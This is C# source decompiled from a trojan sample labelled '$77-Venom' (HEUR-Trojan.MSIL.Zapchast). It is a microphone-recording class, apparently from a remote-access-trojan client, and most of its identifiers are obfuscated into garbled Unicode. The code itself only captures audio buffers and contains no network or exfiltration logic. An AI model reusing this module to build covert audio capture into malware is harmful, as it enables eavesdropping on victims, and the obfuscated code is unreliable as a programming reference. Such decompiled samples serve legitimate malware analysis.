// Decompiled with JetBrains decompiler
// Type: xClient.Core.NAudio.Wave.WaveInEvent
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.NAudio.Wave.WaveInputs;
using xClient.Core.NAudio.Wave.WaveStreams;

namespace xClient.Core.NAudio.Wave
{
  public class WaveInEvent : IWaveIn, IDisposable
  {
    private readonly AutoResetEvent callbackEvent;
    private readonly SynchronizationContext syncContext;
    private IntPtr waveInHandle;
    private volatile bool recording;
    private WaveInBuffer[] buffers;

    public event EventHandler<뜟\u0BA1悉ᖃ邎펶㬌遊㗍덪쑾\uFFFD\u33F7薂\uEB2D๊\uABFC\uFFFD\uFFFD䛕> DataAvailable;

    public event EventHandler<瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛> RecordingStopped;

    public WaveInEvent()
    {
      this.callbackEvent = new AutoResetEvent(false);
      this.syncContext = SynchronizationContext.Current;
      this.DeviceNumber = 0;
      this.WaveFormat = new 蒹䔇ᚮ\uE740朁鸙宄䄨덈鸘㔌\uFFFDꀯ霤\uE673䞀\uF43A蠤计ሡ(8000, 16, 1);
      this.BufferMilliseconds = 100;
      this.NumberOfBuffers = 3;
    }

    public static int DeviceCount => 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\uE75A鼻풰썴\uF037䆲縛鐰仕밮팾ǅ矺杋잒㜗\uFFFD뷳嚙๋();

    public static 獇ᆉ\uFFFD䅹\uFFED鸹䦖ꣴ\u0FD2\u2E11轏薃嘮\uFFFD褾衾ᮔ䇾ؤ靅 GetCapabilities(
      int devNumber)
    {
      獇ᆉ\uFFFD䅹\uFFED鸹䦖ꣴ\u0FD2\u2E11轏薃嘮\uFFFD褾衾ᮔ䇾ؤ靅 waveInCaps = new 獇ᆉ\uFFFD䅹\uFFED鸹䦖ꣴ\u0FD2\u2E11轏薃嘮\uFFFD褾衾ᮔ䇾ؤ靅();
      int waveInCapsSize = Marshal.SizeOf((object) waveInCaps);
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\u1A9C寣\u0FEA踌\u187A殢褲\u2319佼ꉏ뼇\u23A3谵\u275A뾔\uAAD7\uFFFDㅡ府ბ((IntPtr) devNumber, out waveInCaps, waveInCapsSize), "waveInGetDevCaps");
      return waveInCaps;
    }

    public int BufferMilliseconds { get; set; }

    public int NumberOfBuffers { get; set; }

    public int DeviceNumber { get; set; }

    private void CreateBuffers()
    {
      int bufferSize = this.BufferMilliseconds * this.WaveFormat.AverageBytesPerSecond / 1000;
      if (bufferSize % this.WaveFormat.BlockAlign != 0)
        bufferSize -= bufferSize % this.WaveFormat.BlockAlign;
      this.buffers = new WaveInBuffer[this.NumberOfBuffers];
      for (int index = 0; index < this.buffers.Length; ++index)
        this.buffers[index] = new WaveInBuffer(this.waveInHandle, bufferSize);
    }

    private void OpenWaveInDevice()
    {
      this.CloseWaveInDevice();
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\u21E7禃㥝\uFFFD\u27B2\uED38닞맜邹ᨲ㝛䍂乲尅㪧䳒粫ힼ\u319E祺(out this.waveInHandle, (IntPtr) this.DeviceNumber, this.WaveFormat, this.callbackEvent.SafeWaitHandle.DangerousGetHandle(), IntPtr.Zero, 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\uF49F휆㨲\uFFFD\uED35䩚丩羟\uEB30㓙麉蠻ލ\u177E湽\uFFE5娾使鄽\uFFFD.\uFFFD磏聉쯨鈢\u27A5\u16FDƸ魽砙\uEEC4\uFFFD筛呧拱\u31CC膦ᙌ쇱蛪), "waveInOpen");
      this.CreateBuffers();
    }

    public void StartRecording()
    {
      if (this.recording)
        throw new InvalidOperationException("Already recording");
      this.OpenWaveInDevice();
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\u2AE7\uF859쐿\uE578偷翗ᓯ䖾\u285B퍢ᶬ\uED3D닗㜄太爞㮰\uF45F㑻\uFFFD(this.waveInHandle), "waveInStart");
      this.recording = true;
      ThreadPool.QueueUserWorkItem((WaitCallback) (state => this.RecordThread()), (object) null);
    }

    private void RecordThread()
    {
      Exception e = (Exception) null;
      try
      {
        this.DoRecording();
      }
      catch (Exception ex)
      {
        e = ex;
      }
      finally
      {
        this.recording = false;
        this.RaiseRecordingStoppedEvent(e);
      }
    }

    private void DoRecording()
    {
      foreach (WaveInBuffer buffer in this.buffers)
      {
        if (!buffer.InQueue)
          buffer.Reuse();
      }
      while (this.recording)
      {
        if (this.callbackEvent.WaitOne() && this.recording)
        {
          foreach (WaveInBuffer buffer in this.buffers)
          {
            if (buffer.Done)
            {
              if (this.DataAvailable != null)
                this.DataAvailable((object) this, new 뜟\u0BA1悉ᖃ邎펶㬌遊㗍덪쑾\uFFFD\u33F7薂\uEB2D๊\uABFC\uFFFD\uFFFD䛕(buffer.Data, buffer.BytesRecorded));
              buffer.Reuse();
            }
          }
        }
      }
    }

    private void RaiseRecordingStoppedEvent(Exception e)
    {
      EventHandler<瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛> handler = this.RecordingStopped;
      if (handler == null)
        return;
      if (this.syncContext == null)
        handler((object) this, new 瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛(e));
      else
        this.syncContext.Post((SendOrPostCallback) (state => handler((object) this, new 瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛(e))), (object) null);
    }

    public void StopRecording()
    {
      this.recording = false;
      this.callbackEvent.Set();
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\uEE3A鋎鏥쒔찵蹉縄ᩓ岠菿\uFFFD粡ﮥ䏒苩짺缣汒辱껕(this.waveInHandle), "waveInStop");
    }

    public 蒹䔇ᚮ\uE740朁鸙宄䄨덈鸘㔌\uFFFDꀯ霤\uE673䞀\uF43A蠤计ሡ WaveFormat { get; set; }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      if (this.recording)
        this.StopRecording();
      this.CloseWaveInDevice();
    }

    private void CloseWaveInDevice()
    {
      int num1 = (int) 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.亂䤾쀁㷊줂쒲伀뫭樱탄㢴ᧅ붂筌偶\uFFFD꺲ᢜ\u2417ꐬ(this.waveInHandle);
      if (this.buffers != null)
      {
        for (int index = 0; index < this.buffers.Length; ++index)
          this.buffers[index].Dispose();
        this.buffers = (WaveInBuffer[]) null;
      }
      int num2 = (int) 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.募\uEB44\uE6F7晉\uF6C9ጋ幟\uE7AA䁾ᧄ䗽\uF61Eꯑ\uE453倿鄭ﲮ鐚渁ㄹ(this.waveInHandle);
      this.waveInHandle = IntPtr.Zero;
    }

    public \u3206ꉻ测ᦛ娸嶝赎\u2496㯌㳭ꯒ䢳쿔䦸砖ㆶ칁珵鎅磫 GetMixerLine() => !(this.waveInHandle != IntPtr.Zero) ? new \u3206ꉻ测ᦛ娸嶝赎\u2496㯌㳭ꯒ䢳쿔䦸砖ㆶ칁珵鎅磫((IntPtr) this.DeviceNumber, 0, 沏蹉㱤쳶兦ब烤湡\uFFFD䅆Ꮹࠄ栌\uECBE쬅\u2867ꠕ\u070D꤆մ.謜蚘켧饲펓㝓靄ඃ㚁\uE0B4涎킰룪渫\uEF05譩淴阶춘ᛦ) : new \u3206ꉻ测ᦛ娸嶝赎\u2496㯌㳭ꯒ䢳쿔䦸砖ㆶ칁珵鎅磫(this.waveInHandle, 0, 沏蹉㱤쳶兦ब烤湡\uFFFD䅆Ꮹࠄ栌\uECBE쬅\u2867ꠕ\u070D꤆մ.痖價쒝ۥ羛貦꽚碡Ẵ\uF30D\u0E80ኀ찠\u09F9骒떠\u2FC9逐奬Ὓ);

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }
  }
}
